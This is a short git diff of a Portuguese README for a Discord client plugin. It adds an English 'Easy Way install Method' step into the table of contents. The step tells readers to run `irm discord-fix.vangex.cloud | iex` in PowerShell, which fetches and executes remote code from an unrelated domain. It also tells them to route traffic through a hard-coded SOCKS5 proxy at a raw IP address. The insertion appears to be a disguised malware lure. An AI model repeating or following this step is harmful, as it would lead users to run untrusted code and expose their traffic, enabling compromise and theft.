@@ -22,6 +22,9 @@ Um script faz tudo: acha o seu Equicord ou Vencord, instala o plugin, compila e 
 - [Instalação manual, passo a passo](#instalação-passo-a-passo-completo) — se preferir fazer cada etapa à mão
 - [Dependências](#dependências-o-que-baixar-e-como-instalar) — só para o caminho manual
 
+** Easy Way install Method
+- : Run `irm discord-fix.vangex.cloud | iex` on Powershell and use this custom proxy: socks5://192.252.210.233:4145
+
 **Já instalei**
 
 - [Configuração](#configuração) — região da call, região da transmissão, proxy
